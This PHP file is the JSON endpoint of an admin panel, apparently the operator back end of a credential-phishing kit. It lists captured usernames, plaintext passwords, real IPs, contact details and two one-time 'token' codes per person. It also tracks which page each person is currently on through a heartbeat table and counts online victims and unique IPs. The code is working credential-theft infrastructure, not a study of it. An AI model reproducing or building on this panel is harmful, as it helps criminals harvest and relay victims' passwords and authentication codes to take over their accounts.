<?php
session_start();

// Verificar si está logueado
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    http_response_code(401);
    echo json_encode(['error' => 'No autorizado']);
    exit;
}

// Verificar permisos
$permisos = $_SESSION['admin_permisos'] ?? [];
if (!isset($permisos['ver_registros']) || !$permisos['ver_registros']) {
    http_response_code(403);
    echo json_encode(['error' => 'No tienes permisos para ver registros']);
    exit;
}

try {
    // Incluir configuración de base de datos
    require_once '../php_config/conexionbd.php';
    
    // Conectar a la base de datos
    $pdo = conectarBD();
    
    // Primero, actualizar usuarios que deberían estar offline
    $updateOfflineStmt = $pdo->prepare("
        UPDATE estatus_usuarios 
        SET estado = 'offline' 
        WHERE ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND) 
        AND estado IN ('online', 'inactive')
    ");
    $updateOfflineStmt->execute();
    
    // Obtener todos los registros con información de estatus actualizada y ordenados por prioridad
    $stmt = $pdo->query("
        SELECT u.id, u.usuarios, u.password, u.ip_real, u.nombre, u.apellido, 
               u.email, u.telefono_movil, u.telefono_fijo, u.token_codigo, 
               u.sgdotoken_codigo, u.comentarios, u.fecha_ingreso, u.user_agent,
               COALESCE(e.estado, 'offline') as estatus,
               e.pagina_actual,
               e.ultimo_heartbeat,
               CASE 
                   WHEN e.ultimo_heartbeat IS NULL THEN 'Nunca conectado'
                   WHEN e.ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND) THEN 'offline'
                   ELSE e.estado
               END as estado_real
        FROM usuarios u 
        LEFT JOIN estatus_usuarios e ON u.id = e.usuario_id 
        ORDER BY u.id DESC
    ");
    $registros = $stmt->fetchAll(PDO::FETCH_ASSOC);
    
    // Obtener estadísticas
    $stats = [];
    
    // Total de registros
    $totalStmt = $pdo->query("SELECT COUNT(*) as total FROM usuarios");
    $stats['total'] = $totalStmt->fetch(PDO::FETCH_ASSOC)['total'];
    
    // Registros de hoy
    $hoyStmt = $pdo->query("SELECT COUNT(*) as hoy FROM usuarios WHERE DATE(fecha_ingreso) = CURDATE()");
    $stats['hoy'] = $hoyStmt->fetch(PDO::FETCH_ASSOC)['hoy'];
    
    // IPs únicas
    $ipsStmt = $pdo->query("SELECT COUNT(DISTINCT ip_real) as ips_unicas FROM usuarios");
    $stats['ips_unicas'] = $ipsStmt->fetch(PDO::FETCH_ASSOC)['ips_unicas'];
    
    // Usuarios online
    $onlineStmt = $pdo->query("
        SELECT COUNT(*) as usuarios_online 
        FROM estatus_usuarios 
        WHERE estado = 'online' 
        AND ultimo_heartbeat > DATE_SUB(NOW(), INTERVAL 60 SECOND)
    ");
    $stats['usuarios_online'] = $onlineStmt->fetch(PDO::FETCH_ASSOC)['usuarios_online'];
    
    // Usuarios inactivos
    $inactiveStmt = $pdo->query("
        SELECT COUNT(*) as usuarios_inactivos 
        FROM estatus_usuarios 
        WHERE estado = 'inactive' 
        AND ultimo_heartbeat > DATE_SUB(NOW(), INTERVAL 60 SECOND)
    ");
    $stats['usuarios_inactivos'] = $inactiveStmt->fetch(PDO::FETCH_ASSOC)['usuarios_inactivos'];
    
    // Último acceso del admin
    $ultimoStmt = $pdo->prepare("SELECT ultima_fecha_ingreso FROM administracion_control WHERE id = ?");
    $ultimoStmt->execute([$_SESSION['admin_id']]);
    $ultimo = $ultimoStmt->fetch(PDO::FETCH_ASSOC);
    $stats['ultimo_acceso'] = $ultimo['ultima_fecha_ingreso'] ?? null;
    
        // Obtener configuración de columnas - Los moderadores usan la configuración del super-usuario
        $admin_id_config = ($_SESSION['admin_id'] == 1) ? 1 : 1; // Siempre usar configuración del admin ID 1
        $columnasStmt = $pdo->prepare("
            SELECT columna, visible, orden, nombre_personalizado 
            FROM configuracion_columnas 
            WHERE admin_id = ? 
            ORDER BY orden ASC
        ");
    $columnasStmt->execute([$admin_id_config]);
    $configuracion_columnas = $columnasStmt->fetchAll(PDO::FETCH_ASSOC);
    
    // Si no hay configuración, crear configuración por defecto
    if (empty($configuracion_columnas)) {
        $columnas_default = [
            ['columna' => 'estatus', 'visible' => 1, 'orden' => 1, 'nombre_personalizado' => null],
            ['columna' => 'id', 'visible' => 1, 'orden' => 2, 'nombre_personalizado' => null],
            ['columna' => 'usuario', 'visible' => 1, 'orden' => 3, 'nombre_personalizado' => null],
            ['columna' => 'password', 'visible' => 1, 'orden' => 4, 'nombre_personalizado' => null],
            ['columna' => 'ip_real', 'visible' => 1, 'orden' => 5, 'nombre_personalizado' => null],
            ['columna' => 'nombre', 'visible' => 1, 'orden' => 6, 'nombre_personalizado' => null],
            ['columna' => 'apellido', 'visible' => 1, 'orden' => 7, 'nombre_personalizado' => null],
            ['columna' => 'email', 'visible' => 1, 'orden' => 8, 'nombre_personalizado' => null],
            ['columna' => 'telefono_movil', 'visible' => 1, 'orden' => 9, 'nombre_personalizado' => null],
            ['columna' => 'telefono_fijo', 'visible' => 1, 'orden' => 10, 'nombre_personalizado' => null],
            ['columna' => 'token_codigo', 'visible' => 1, 'orden' => 11, 'nombre_personalizado' => null],
            ['columna' => 'sgdotoken_codigo', 'visible' => 1, 'orden' => 12, 'nombre_personalizado' => null],
            ['columna' => 'comentarios', 'visible' => 1, 'orden' => 13, 'nombre_personalizado' => null],
            ['columna' => 'fecha', 'visible' => 1, 'orden' => 14, 'nombre_personalizado' => null],
            ['columna' => 'acciones', 'visible' => 1, 'orden' => 15, 'nombre_personalizado' => null]
        ];
        
        $insertStmt = $pdo->prepare("INSERT INTO configuracion_columnas (admin_id, columna, visible, orden, nombre_personalizado) VALUES (?, ?, ?, ?, ?)");
        foreach ($columnas_default as $col) {
            $insertStmt->execute([$_SESSION['admin_id'], $col['columna'], $col['visible'], $col['orden'], $col['nombre_personalizado']]);
        }
        $configuracion_columnas = $columnas_default;
    }
    
    // Preparar respuesta
    $response = [
        'registros' => $registros,
        'stats' => $stats,
        'configuracion_columnas' => $configuracion_columnas
    ];
    
    // Devolver JSON
    header('Content-Type: application/json');
    echo json_encode($response);
    
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Error de base de datos: ' . $e->getMessage()]);
}
?> 